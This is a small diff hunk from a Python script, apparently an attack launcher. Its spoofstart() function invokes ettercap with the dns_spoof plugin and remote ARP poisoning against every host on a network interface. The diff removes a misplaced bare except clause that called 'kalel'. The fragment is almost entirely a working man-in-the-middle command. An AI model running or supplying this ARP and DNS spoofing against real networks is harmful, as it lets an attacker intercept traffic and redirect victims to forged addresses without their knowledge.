@@ -103,8 +103,6 @@ def spoofstart():
         subprocess.call([etterdir, '-T', '-q', '-i', iface, '-P', 'dns_spoof', '-M', 'ARP:remote', '///', '///',])
     else:
         subprocess.call(['ettercap', '-T', '-q', '-i', iface, '-P', 'dns_spoof', '-M', 'ARP:remote', '///', '///',])
-    except:
-        subprocess.call(['kalel'])
 
 
 try:
